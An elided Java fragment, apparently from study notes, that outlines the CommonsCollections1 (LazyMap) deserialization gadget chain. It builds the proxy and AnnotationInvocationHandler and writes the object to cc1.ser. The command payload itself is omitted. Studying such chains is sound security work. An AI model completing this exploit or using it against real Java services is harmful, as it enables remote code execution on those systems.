...
public class CommonsCollections1_lazy {
    ...
    public static void main(String[] args) throws NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        ...
        // LazyMap#get(key) --> ChainedTransformer#transform()
        ...
        // proxyMap#entrySet() --> AnnotationInvocationHandler#invoke() --> LazyMap#get(key)
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
        // AnnotationInvocationHandler#readObject() --> proxyMap#entrySet
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);

        //打开序列化数据工具SerializationDumper
        FileOutputStream barr = new FileOutputStream("cc1.ser");
